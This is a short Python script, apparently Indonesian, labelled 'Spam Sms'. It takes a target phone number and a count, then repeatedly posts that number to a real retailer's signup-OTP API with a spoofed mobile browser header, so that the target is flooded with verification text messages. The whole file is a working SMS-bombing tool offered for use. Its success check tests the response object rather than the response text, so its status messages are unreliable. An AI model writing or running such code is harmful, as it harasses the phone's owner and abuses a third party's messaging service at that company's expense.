import json
import requests
import os
import sys

def main():
	os.system('clear')
	os.system('figlet Spam Sms')
	banner = '''
[+]------------------------------[+]
 |    [•] YouTube: AndikaOfficial |
 |    [•] Github: MrYou12         |
[+]------------------------------[+]
'''
	print(banner)
	print('Example: 0812xxxxxxx')
	no = input('Target : ')
	jum = input('Jumlah Spam : ')

	head =  {
	"User-Agent": "Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/uset/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}

	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'error' in leosureo:
			print('[-] Gagal Mengirim '+ no)
		else:
			print('[+] Sukses Mengirim '+no)
main()
